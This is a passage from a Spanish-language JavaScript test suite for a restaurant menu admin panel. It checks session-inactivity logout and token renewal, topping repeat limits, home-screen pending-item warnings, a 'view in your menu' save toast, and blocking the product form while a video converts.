	const reglas = (extra = {}) => cargar('sesion.js', [['sesion.js', 'const SESION_INACTIVA_MS', null]],
		Object.assign({ Date, Math, String, JSON, atob: s => Buffer.from(s, 'base64').toString('binary') }, extra));
	const MIN = 60 * 1000;
	const T0 = 1_000_000_000_000;
	const decidir = (ctx, ahora, o) => ctx.decisionDeSesion(T0 + ahora,
		Object.assign({ ultimaActividad: T0, ultimaRenovacion: T0, preguntadaEn: null, subiendoVideo: false }, o));

	test('usándolo, no pregunta nada', () => {
		const ctx = reglas();
		assert.equal(decidir(ctx, 5 * MIN, { ultimaActividad: T0 + 4 * MIN }), 'nada');
	});

	test('usándolo, renueva el token como mucho cada diez minutos', () => {
		// Así las 8 h del servidor cuentan desde el último uso: quien trabaja
		// no se topa nunca con el corte.
		const ctx = reglas();
		assert.equal(decidir(ctx, 9 * MIN, { ultimaActividad: T0 + 8 * MIN }), 'nada');
		assert.equal(decidir(ctx, 10 * MIN, { ultimaActividad: T0 + 9 * MIN }), 'renovar');
	});

	test('sin actividad desde la última renovación, no renueva', () => {
		// Una pestaña olvidada no puede estirar su sesión sola.
		const ctx = reglas();
		assert.equal(decidir(ctx, 30 * MIN, { ultimaActividad: T0 - MIN }), 'nada');
	});

	test('una hora sin tocar nada: pregunta', () => {
		const ctx = reglas();
		assert.equal(decidir(ctx, 59 * MIN), 'nada');
		assert.equal(decidir(ctx, 60 * MIN), 'preguntar');
	});

	test('preguntado y sin respuesta en dos minutos: cierra', () => {
		const ctx = reglas();
		assert.equal(decidir(ctx, 61 * MIN, { preguntadaEn: T0 + 60 * MIN }), 'esperar');
		assert.equal(decidir(ctx, 62 * MIN, { preguntadaEn: T0 + 60 * MIN }), 'cerrar');
	});

	test('volviendo de una suspensión larga cierra sin preguntar', () => {
		// Con el portátil cerrado los temporizadores se paran. Al abrirlo ya pasó
		// todo el tiempo: preguntar daría dos minutos a una sesión desatendida.
		const ctx = reglas();
		assert.equal(decidir(ctx, 5 * 60 * MIN), 'cerrar');
	});

	test('con un video subiendo no pregunta ni cierra: renueva', () => {
		// Cerrar la sesión cortaría la subida, y quien sube está delante.
		const ctx = reglas();
		assert.equal(decidir(ctx, 5 * 60 * MIN, { subiendoVideo: true }), 'renovar');
		assert.equal(decidir(ctx, 5 * MIN, { subiendoVideo: true }), 'nada');
	});

	test('la última renovación se lee del token, no de la hora de carga', () => {
		// Tras recargar, un token de hace 7 h 55 min no puede esperar diez
		// minutos más a renovarse: caducaría antes.
		const ctx = reglas();
		const jwt = require('jsonwebtoken');
		const t = jwt.sign({ rol: 'cliente' }, 'x');
		const iat = JSON.parse(Buffer.from(t.split('.')[1], 'base64').toString()).iat;
		assert.equal(ctx.emitidoEn(t), iat * 1000);
		assert.equal(ctx.emitidoEn('basura'), 0, 'ilegible: se renueva al primer uso');
	});

	function pantalla() {
		const els = {};
		const cls = () => { const s = new Set(); return { add: c => s.add(c), remove: c => s.delete(c), contains: c => s.has(c) }; };
		const $ = id => (els[id] ||= { id, textContent: '', style: {}, classList: cls(), focus() {} });
		const hechos = [];
		const ctx = reglas({
			document: { getElementById: $, body: { style: {} }, querySelector: () => null },
			state: { subiendoVideo: false },
			sessionStorage: { setItem: (k, v) => hechos.push(['guardar', k, v]) },
			apiFetch: async (m, ruta) => { hechos.push([m, ruta]); return { token: 'nuevo' }; },
			logout: () => hechos.push(['logout']),
		});
		vm.runInContext('var token = "viejo";', ctx);
		return { ctx, $, hechos };
	}

	test('«Sigo aquí» cierra la pregunta y renueva', async () => {
		const { ctx, $, hechos } = pantalla();
		ctx.preguntarSiSigue();
		assert.equal($('sesionModal').classList.contains('open'), true);
		assert.equal($('sesionCuenta').textContent, '2:00');
		await ctx.sigoAqui();
		assert.equal($('sesionModal').classList.contains('open'), false);
		assert.deepEqual(hechos[0], ['POST', '/api/sesion/renovar']);
		assert.equal(vm.runInContext('token', ctx), 'nuevo');
		assert.deepEqual(hechos[1], ['guardar', 'menuAdminToken', 'nuevo']);
	});

	test('con la pregunta a la vista, mover el ratón no cuenta como respuesta', () => {
		// Un roce la dejaría ahí para siempre sin haberla leído.
		const { ctx } = pantalla();
		ctx.preguntarSiSigue();
		const antes = vm.runInContext('sesionUltimaActividad', ctx);
		vm.runInContext('sesionUltimaActividad = 0;', ctx);
		ctx.anotarActividad();
		assert.equal(vm.runInContext('sesionUltimaActividad', ctx), 0);
		assert.ok(antes > 0);
	});

	test('sin respuesta, cierra la sesión y lo dice en el login', () => {
		const { ctx, $, hechos } = pantalla();
		ctx.cerrarSesionPorInactividad();
		assert.deepEqual(hechos, [['logout']]);
		assert.match($('loginError').textContent, /no hubo actividad/);
	});

	test('sin sesión abierta, el vigilante no hace nada', () => {
		const { ctx, hechos } = pantalla();
		vm.runInContext('token = null; sesionUltimaActividad = 0;', ctx);
		ctx.revisarSesion();
		assert.deepEqual(hechos, []);
	});

	test('el panel lo arranca, y «¿Sigues ahí?» queda por encima de todo', () => {
		const src = codigoDelPanel();
		assert.match(src, /vigilarMenusMas\(\);\nvigilarSesion\(\);/);
		assert.match(src, /<script src="sesion\.js"><\/script>/);
		assert.match(src, /id="sesionModal" style="z-index:600"/);
	});
});

describe('adicionales que se pueden pedir varias veces', () => {
	// 17/09/2026, decidido con el usuario: solo los de COSTO y solo si el
	// restaurante lo enciende en ESE adicional. La carta lo lee en
	// vmenus-app/core/carrito.js.
	const reglas = () => cargar('toppings.js', '// El tope que se guarda', 'function confirmAddTopping', {});

	test('el tope se sanea igual que en la carta', () => {
		const ctx = reglas();
		assert.equal(ctx.topeDeAdicional(0), 2, 'un tope de cero no puede desactivar el chip');
		assert.equal(ctx.topeDeAdicional('tres'), 2);
		assert.equal(ctx.topeDeAdicional(999), 20);
		assert.equal(ctx.topeDeAdicional(3), 3);
	});

	test('y el número es el mismo que el de la carta', () => {
		// Dos aplicaciones desplegadas por separado no pueden compartir el
		// módulo; discrepar es prometer un máximo que la carta no respeta.
		const otroRepo = path.join(__dirname, '..', '..', 'vmenus-app', 'core', 'carrito.js');
		const nuestro = codigoDelPanel().match(/TOPE_MAXIMO_ADICIONAL = (\d+)/)?.[1];
		assert.ok(nuestro, 'el panel tiene que declarar el techo');
		// En CI solo se clona este repositorio (ver CLAUDE.md).
		if (!fs.existsSync(otroRepo)) return;
		const suyo = fs.readFileSync(otroRepo, 'utf8').match(/TOPE_MAXIMO_ADICIONAL = (\d+)/)?.[1];
		assert.equal(nuestro, suyo);
	});

	test('el chip del catálogo dice hasta cuántas veces', () => {
		// Si no, «se puede repetir» solo se veía abriendo cada uno.
		const ctx = reglas();
		assert.equal(ctx.etiquetaDeTopping({ nombre: 'Tocineta', precio: 4000, repetible: true, max: 3 }, 'premium'),
			'Tocineta · $4.000 · hasta 3');
		assert.equal(ctx.etiquetaDeTopping({ nombre: 'Huevo', precio: 2000 }, 'premium'), 'Huevo · $2.000');
		assert.equal(ctx.etiquetaDeTopping({ nombre: 'Queso' }, 'platino'), 'Queso');
	});

	test('el catálogo que se guarda conserva la repetición', () => {
		// Se lee con catalogoDe en cada guardado de Ajustes: perderla aquí la
		// apagaría al cambiar cualquier otra cosa de esa pantalla.
		const ctx = cargar('index.html', 'function catalogoDe', 'function marcadoPorId',
			{ Array, Number, String, topeDeAdicional: v => Math.min(Math.max(Math.floor(Number(v)) || 2, 2), 20) });
		const cat = ctx.catalogoDe({
			toppings_premium: [
				{ id: 't1', nombre: 'Tocineta', precio: 4000, repetible: true, max: 3 },
				{ id: 't2', nombre: 'Huevo', precio: 2000 },
			],
		});
		assert.equal(cat.premium[0].repetible, true);
		assert.equal(cat.premium[0].max, 3);
		assert.equal('repetible' in cat.premium[1], false, 'lo que no se repite no guarda la clave');
	});
});

// ═══════════════════════════════════════════════════════════════
describe('Inicio: qué pide una acción y qué tiene encendido la carta', () => {
	// Rehecha el 17/09/2026 tras mirarla con los datos de Bonzas: le decía «38
	// productos sin foto» y los 38 estaban en categorías de vista lista, donde la
	// carta no enseña fotos. Y un carrito sin WhatsApp no salía por ningún lado.
	const reglas = () => cargar('inicio.js', [
		['index.html', '// ── ¿LA CARTA TIENE CARRITO DE VERDAD?', '// Mismo criterio que la carta'],
		['index.html', 'function recibePedidos', 'function formatoDeLaCarta'],
		['inicio.js', 'function productoGratis', '// ── PINTAR'],
	], {
		MODELO_POR_DEFECTO: 'topnav',
		MODELOS_CARRITO_OPCIONAL: ['video', 'vertical', 'topnav', 'sidebar', 'explorar'],
		esModeloDeVideo: nav => ['video', 'vertical'].includes(nav),
		MINIMO_PLATOS_BUSCADOR: 8,
		Number, String, Array, Set,
	});
	const PLAN = { carrito: true };
	const cat = (id, sin_fotos = false) => ({ id, nombre: id, sin_fotos });
	const plato = (id, categoria_id, extra = {}) =>
		({ id, nombre: id, categoria_id, precio_numerico: 1000, disponible: true, imagen_url: 'https://x/f.jpg', atributos: {}, ...extra });
	const claves = r => [...r.pendientes].map(p => p.clave);

	test('un plato sin foto en una categoría de lista no es pendiente', () => {
		// Es el caso de Bonzas: la carta no enseña foto ahí, no hay nada que hacer.
		const r = reglas().revisionDeInicio({
			categorias: [cat('bebidas', true)],
			productos: [plato('agua', 'bebidas', { imagen_url: null })],
			atributos: { nav: 'topnav' }, plan: PLAN,
		});
		assert.deepEqual(claves(r), []);
	});

	test('donde la carta sí enseña la foto, falta y se dice', () => {
		const r = reglas().revisionDeInicio({
			categorias: [cat('burgers')],
			productos: [plato('a', 'burgers', { imagen_url: null }), plato('b', 'burgers', { imagen_url: null })],
			atributos: { nav: 'topnav' }, plan: PLAN,
		});
		assert.deepEqual(claves(r), ['imagen']);
		assert.equal(r.pendientes[0].titulo, '2 platos sin foto');
	});

	test('en una carta de video lo que falta es el video, no la foto', () => {
		const r = reglas().revisionDeInicio({
			categorias: [cat('platos')],
			productos: [plato('a', 'platos', { atributos: {} }), plato('b', 'platos', { atributos: { video: { url: 'https://x/v.mp4' } } })],
			atributos: { nav: 'vertical' }, plan: PLAN,
		});
		assert.equal(r.pendientes[0].titulo, '1 plato sin video');
	});

	test('el carrito sin WhatsApp va el primero: es el que pierde pedidos', () => {
		const r = reglas().revisionDeInicio({
			categorias: [cat('c'), cat('vacia')],
			productos: [plato('a', 'c', { imagen_url: null })],
			atributos: { nav: 'sidebar', carrito: true, whatsapp_pedidos: '' }, plan: PLAN,
		});
		assert.deepEqual(claves(r), ['whatsapp', 'imagen', 'categorias']);
		assert.equal(r.pendientes[0].grave, true);
	});

	test('con el número puesto no hay aviso', () => {
		const r = reglas().revisionDeInicio({
			categorias: [cat('c')], productos: [plato('a', 'c')],
			atributos: { nav: 'sidebar', carrito: true, whatsapp_pedidos: '573001112233' }, plan: PLAN,
		});
		assert.deepEqual(claves(r), []);
	});

	test('un cero marcado como «Gratis» no es un precio pendiente', () => {
		const r = reglas().revisionDeInicio({
			categorias: [cat('c')],
			productos: [plato('a', 'c', { precio_numerico: 0 }), plato('b', 'c', { precio_numerico: 0, atributos: { precio_gratis: true } })],
			atributos: {}, plan: PLAN,
		});
		assert.equal(r.pendientes[0].titulo, '1 plato con precio en cero');
	});

	test('lo que está bien se resume, no ocupa filas', () => {
		const r = reglas().revisionDeInicio({
			categorias: [cat('c')], productos: [plato('a', 'c')], atributos: {}, plan: PLAN,
		});
		assert.deepEqual([...r.enOrden], ['fotos', 'precios', 'categorías']);
	});

	test('el buscador dice «encendido» solo si el comensal lo ve', () => {
		// Con cinco platos la carta no lo enseña: decir encendido sería
		// prometerle al restaurante algo que no ve.
		const ctx = reglas();
		const buscador = productos => [...ctx.funcionesDeInicio({ productos, atributos: {}, plan: PLAN })]
			.find(f => f.clave === 'buscador');
		assert.equal(buscador(Array.from({ length: 5 }, (_, i) => plato('p' + i, 'c'))).encendido, false);
		assert.equal(buscador(Array.from({ length: 12 }, (_, i) => plato('p' + i, 'c'))).encendido, true);
	});

	test('los destacados del televisor también cuentan', () => {
		const ctx = reglas();
		const f = [...ctx.funcionesDeInicio({ promociones: [{ activa: true, en_popup: false, en_tv: true }], atributos: {}, plan: PLAN })]
			.find(x => x.clave === 'destacados');
		assert.equal(f.encendido, true);
	});
});

// ═══════════════════════════════════════════════════════════════
describe('un plato que no lleva foto a propósito', () => {
	// 18/09/2026, pedido por el usuario: hay platos a los que no les toca foto
	// aunque su categoría las lleve —una bebida, un adicional—, y sin marcarlo
	// Inicio los contaba como pendientes para siempre.
	const src = codigoDelPanel();
	const reglas = () => cargar('inicio.js', [
		['index.html', '// ── ¿LA CARTA TIENE CARRITO DE VERDAD?', '// Mismo criterio que la carta'],
		['index.html', 'function recibePedidos', 'function formatoDeLaCarta'],
		['inicio.js', 'function productoGratis', '// ── PINTAR'],
	], {
		MODELO_POR_DEFECTO: 'topnav', MODELOS_CARRITO_OPCIONAL: [],
		esModeloDeVideo: nav => ['video', 'vertical'].includes(nav),
		MINIMO_PLATOS_BUSCADOR: 8, Number, String, Array, Set,
	});
	const cats = [{ id: 'c', nombre: 'Limonadas', sin_fotos: false }];
	const plato = (id, extra = {}) => ({ id, nombre: id, categoria_id: 'c', precio_numerico: 1, disponible: true, imagen_url: null, atributos: {}, ...extra });

	test('marcado «no lleva foto», no cuenta como pendiente', () => {
		const r = reglas().revisionDeInicio({ categorias: cats, atributos: {}, plan: {},
			productos: [plato('a', { atributos: { sin_foto: true } }), plato('b')] });
		assert.equal(r.pendientes[0].titulo, '1 plato sin foto');
	});

	test('el aviso dice en qué categorías faltan y cómo marcarlo', () => {
		const r = reglas().revisionDeInicio({ categorias: cats, atributos: {}, plan: {}, productos: [plato('b')] });
		assert.match(r.pendientes[0].nota, /En: Limonadas\./);
		assert.match(r.pendientes[0].nota, /márcalo así en su ficha/);
	});

	test('ya no dice «recuadro vacío» donde no lo hay', () => {
		// En Topnav y Sidebar un plato sin foto sale como una fila compacta.
		const ctx = reglas();
		assert.doesNotMatch(ctx.notaDeImagen('topnav', false), /recuadro/);
		assert.match(ctx.notaDeImagen('explorar', false), /recuadro/);
	});

	test('el servidor la acepta y la guarda como booleano', () => {
		// Sin estar en la lista de atributos permitidos, la casilla se
		// descartaría en silencio al guardar.
		const servidor = fs.readFileSync(path.join(__dirname, '..', 'server.js'), 'utf8');
		assert.match(servidor.match(/const ATRIBUTOS_PRODUCTO_PERMITIDOS = \[[^\]]*\]/)[0], /'sin_foto'/);
		assert.match(servidor, /\['precio_gratis', 'sin_foto'\]\.includes\(clave\) \? entrantes\[clave\] === true/);
	});

	test('marcar la casilla cuenta como cambio sin guardar', () => {
		const firma = src.match(/function firmaProducto\(\) \{[\s\S]*?\n\}/)[0];
		assert.match(firma, /editSinFoto/);
		assert.match(firma, /editPrecioGratis/, 'y «Gratis», que tampoco estaba');
	});
});

describe('«guardado» con un botón para ver la carta', () => {
	// 18/09/2026: tras guardar, lo siguiente es ir a mirar cómo quedó. El botón
	// solo va donde lo guardado ya se ve: prometer un cambio que al abrir la
	// carta no está es peor que no ofrecer nada.
	const reglas = (extra = {}) => cargar('ver-en-la-carta.js', [
		['index.html', 'const VMENUS_PUBLIC_URL', '// ── PLAN EN APARIENCIA'],
		['ver-en-la-carta.js', 'const VER_CARTA_DURACION_MS', null],
	], Object.assign({ state: { restaurante: null } }, extra));
	const BONZAS = { slug: 'bonzas', activo: true, atributos: {} };

	test('lleva a la dirección oficial de la carta, y a /tv para la pantalla', () => {
		const ctx = reglas();
		assert.equal(ctx.destinoVerCarta(BONZAS), 'https://menu.vmenus.co/bonzas');
		assert.equal(ctx.destinoVerCarta({ ...BONZAS, atributos: { url_modo: 'subdominio' } }), 'https://bonzas.vmenus.co');
		assert.equal(ctx.destinoVerCarta(BONZAS, 'tv'), 'https://menu.vmenus.co/bonzas/tv');
	});

	test('sin restaurante, o con uno suspendido, no hay botón', () => {
		const ctx = reglas();
		assert.equal(ctx.destinoVerCarta(null), null);
		assert.equal(ctx.destinoVerCarta({ ...BONZAS, slug: '' }), null);
		assert.equal(ctx.destinoVerCarta({ ...BONZAS, activo: false }), null, 'su carta dice «no disponible»');
	});

	test('el aviso trae el botón y el botón abre la carta en otra pestaña', () => {
		const avisos = [], abiertas = [];
		const ctx = reglas({
			state: { restaurante: BONZAS },
			showToast: (msg, tipo, accion) => avisos.push({ msg, tipo, accion }),
			window: { open: (...a) => abiertas.push(a) },
		});
		ctx.avisarGuardadoConCarta('Producto guardado');
		assert.equal(avisos[0].tipo, 'success');
		assert.match(avisos[0].accion.texto, /Ver en tu carta/);
		avisos[0].accion.alPulsar();
		assert.deepEqual([...abiertas[0]], ['https://menu.vmenus.co/bonzas', '_blank', 'noopener']);
	});

	test('sin a dónde ir, el aviso de siempre sin botón', () => {
		const avisos = [];
		const ctx = reglas({ state: { restaurante: { ...BONZAS, activo: false } }, showToast: (...a) => avisos.push(a) });
		ctx.avisarGuardadoConCarta('Producto guardado');
		assert.deepEqual([...avisos[0]], ['Producto guardado', 'success']);
	});

	test('un destacado en borrador no se ve en ningún sitio', () => {
		const ctx = reglas();
		assert.equal(ctx.pantallaDelDestacado({ activa: false, en_popup: true, en_tv: true }), null);
		assert.equal(ctx.pantallaDelDestacado({ activa: true, en_popup: true, en_tv: true }), 'carta');
		assert.equal(ctx.pantallaDelDestacado({ activa: true, en_popup: false, en_tv: true }), 'tv');
		assert.equal(ctx.pantallaDelDestacado({ activa: true, en_popup: false, en_tv: false }), null);
	});

	test('los «guardado» con otra mitad pendiente no llevan el botón', () => {
		// La carta enseñaría una mezcla de lo guardado y lo de antes.
		const html = fs.readFileSync(path.join(PUBLIC, 'index.html'), 'utf8');
		assert.match(html, /if \(aparienciaPendiente\) showToast\('Datos guardados/);
		assert.match(html, /if \(datosPendientes\) showToast\('Configuración guardada · los datos/);
		assert.match(fs.readFileSync(path.join(PUBLIC, 'ajustes.js'), 'utf8'), /if \(faltaNumero\) showToast\(/);
	});

	test('el archivo se carga después de comun.js e index.html lo usa', () => {
		const html = fs.readFileSync(path.join(PUBLIC, 'index.html'), 'utf8');
		assert.ok(html.indexOf('src="ver-en-la-carta.js"') > html.indexOf('src="comun.js"'));
		assert.ok((html.match(/avisarGuardadoConCarta\(/g) || []).length >= 10);
	});
});

// ═══════════════════════════════════════════════════════════════
describe('video recién subido · la ficha no se cierra mientras convierte', () => {
	// El 18/09/2026, con el bloqueo ya desplegado, subir un video y cerrar la
	// ficha durante la conversión seguía funcionando. La puerta de salida busca
	// el trabajo en state.trabajosVideo, y la subida no lo apuntaba ahí: solo
	// se bloqueaba al reabrir el plato. Las pruebas de arriba no lo veían
	// porque le dan el trabajo hecho a trabajoEnCursoDe.
	const montar = ({ vigilando = null, trabajos = [] } = {}) => {
		const mapa = {
			editProductId:  { value: 'p1' },
			procesoTexto:   { textContent: '' },
			procesoTitulo:  { textContent: '' },
			procesoNota:    { textContent: '' },
			procesoSeguir:  { textContent: '' },
			procesoSalir:   { style: {} },
		};
		const abiertos = [], cerrados = [];
		const ctx = cargar('index.html', [
			['function trabajoEnCursoDe', '// El trabajo terminado de un plato'],
			['function firmaProducto', 'async function saveProduct'],
		], {
			state: { pendingImgUrl: null, extraImgs: [], prodFiltros: [], prodBadges: {},
				subiendoVideo: false, vigilandoTrabajo: vigilando, trabajosVideo: trabajos },
			videoElegido: null,
			document: { getElementById: id => mapa[id] },
			openModal:  id => abiertos.push(id),
			closeModal: id => cerrados.push(id),
		});
		return { ctx, mapa, abiertos, cerrados };
	};

	test('al terminar la subida, el trabajo cuenta como en marcha', () => {
		const { ctx, abiertos, cerrados } = montar({ vigilando: 't9' });
		ctx.anotarTrabajoEnCurso('t9', 'p1');
		ctx.fijarFirmaProducto();
		ctx.intentarCerrarProducto();

		assert.equal(ctx.procesoEnMarchaDelPlato(), 'convirtiendo');
		assert.deepEqual(abiertos, ['procesoModal']);
		assert.deepEqual(cerrados, [], 'la ficha sigue abierta');
	});

	test('sin apuntarlo, la ficha se cerraba (el fallo de antes)', () => {
		// Control: demuestra que lo que bloquea es el apunte y no otra cosa.
		const { ctx, cerrados } = montar({ vigilando: 't9' });
		ctx.fijarFirmaProducto();
		ctx.intentarCerrarProducto();
		assert.deepEqual(cerrados, ['productModal']);
	});

	test('apuntarlo dos veces no duplica el trabajo', () => {
		const { ctx } = montar();
		ctx.anotarTrabajoEnCurso('t9', 'p1');
		ctx.anotarTrabajoEnCurso('t9', 'p1');
		assert.equal(ctx.state.trabajosVideo.length, 1);
	});

	test('no toca los trabajos de otros platos', () => {
		const otro = { id: 't1', producto_id: 'p2', estado: 'listo' };
		const { ctx } = montar({ trabajos: [otro] });
		ctx.anotarTrabajoEnCurso('t9', 'p1');
		assert.equal(ctx.state.trabajosVideo.length, 2);
		assert.equal(ctx.trabajoEnCursoDe('p2'), null);
	});

	test('se apunta antes de vigilar, dentro de la subida', () => {
		// Si fuera después del finally, entre subiendoVideo=false y el apunte
		// habría un instante en que la ficha se deja cerrar.
		const src = fs.readFileSync(path.join(PUBLIC, 'index.html'), 'utf8');
		const subir = src.match(/async function confirmarSubidaVideo\(\) \{[\s\S]*?\n\}/)[0];
		const anota = subir.indexOf('anotarTrabajoEnCurso(r.trabajo_id');
		assert.notEqual(anota, -1, 'la subida tiene que apuntar el trabajo');
		assert.ok(anota < subir.indexOf('vigilarVideo(r.trabajo_id'));
		assert.ok(anota < subir.indexOf('} finally'));
	});
});

// ═══════════════════════════════════════════════════════════════
describe('guardar con el video en marcha · guarda, pero no saca de la ficha', () => {
	// saveProduct cerraba la ficha por su cuenta: era una quinta salida que
	// no pasaba por intentarCerrarProducto.
	const montar = ({ subiendoVideo = false, enCurso = null, vigilando = null, videoElegido = null } = {}) => {
		const mapa = {
			btnSaveProduct:   { textContent: '', disabled: false },
			editProductId:    { value: 'p1' },
			editCategoria:    { value: 'cat-1' },
			editNombre:       { value: 'Croquetas' },
			editPrecioNum:    { value: '24000' },
			editDesc:         { value: '' },
			editDescAvanzada: { value: '' },
			editDisponible:   { checked: true },
			editPrecioGratis: { checked: false },
			editSinFoto:      { checked: false },
		};
		// Lo que toca limpiarErroresFicha, que viene cargada con el primer trozo.
		for (const el of Object.values(mapa)) {
			el.classList = { add() {}, remove() {} };
			el.removeAttribute = () => {};
		}
		const cerrados = [], avisos = [];
		const ctx = cargar('index.html', [
			['function firmaProducto', 'async function saveProduct'],
			['async function saveProduct', '// ── CATEGORÍAS ──'],
		], {
			state: { pendingImgUrl: null, extraImgs: [], prodFiltros: [], prodBadges: {}, prodPers: {},
				productos: [{ id: 'p1', atributos: {} }], subiendoVideo, vigilandoTrabajo: vigilando },
			videoElegido,
			document: { getElementById: id => mapa[id], querySelectorAll: () => [] },
			trabajoEnCursoDe: () => enCurso,
			erroresDeFicha: () => [], limpiarErroresFicha() {}, formatPrecio: n => String(n),
			apiFetch: async () => ({}),
			renderCatFilter() {}, renderProducts() {}, renderInicio() {},
			openModal() {}, closeModal: id => cerrados.push(id),
			showToast: t => avisos.push(t), avisarGuardadoConCarta: t => avisos.push(t),
		});
		return { ctx, cerrados, avisos };
	};

	test('sin video en marcha, guarda y cierra como siempre', async () => {
		const { ctx, cerrados } = montar();
		await ctx.saveProduct();
		assert.deepEqual(cerrados, ['productModal']);
	});

	test('convirtiendo, guarda y la ficha se queda abierta', async () => {
		const { ctx, cerrados, avisos } = montar({ enCurso: { id: 't1' }, vigilando: 't1' });
		await ctx.saveProduct();
		assert.deepEqual(cerrados, []);
		assert.match(avisos[0], /sigue abierta/);
	});

	test('subiendo, lo mismo', async () => {
		const { ctx, cerrados } = montar({ subiendoVideo: true });
		await ctx.saveProduct();
		assert.deepEqual(cerrados, []);
	});

	test('sin nadie vigilando el trabajo, cierra: no se encierra a nadie', async () => {
		const { ctx, cerrados } = montar({ enCurso: { id: 't1' }, vigilando: null });
		await ctx.saveProduct();
		assert.deepEqual(cerrados, ['productModal']);
	});

	test('guardar mientras sube no deja un falso "cambios sin guardar"', async () => {
		// La subida suelta el archivo al llegar. Si la firma lo contara, al
		// cerrar después saldría el aviso sin haber nada pendiente.
		const { ctx } = montar({ subiendoVideo: true, videoElegido: { name: 'plato.mov' } });
		await ctx.saveProduct();
		assert.equal(ctx.videoElegido.name, 'plato.mov', 'el archivo sigue elegido mientras sube');
		ctx.videoElegido = null;
		assert.equal(ctx.productoTieneCambios(), false);
	});
});
